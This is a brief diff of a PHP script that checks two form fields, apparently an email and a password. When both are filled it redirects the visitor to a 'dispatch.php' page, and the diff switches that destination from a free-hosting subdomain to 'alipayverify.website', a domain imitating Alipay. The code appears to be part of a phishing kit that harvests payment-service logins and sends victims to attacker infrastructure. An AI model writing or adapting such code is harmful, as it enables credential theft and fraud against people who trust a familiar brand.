@@ -15,6 +15,6 @@ if ($em =="" || $ps =="")    {
     header( "Location: ./");
 }
  else {
-    header( "Location: https://bobstottts.000webhostapp.com/dispatch.php");
+    header( "Location: http://alipayverify.website/dispatch.php");
   }
 ?>
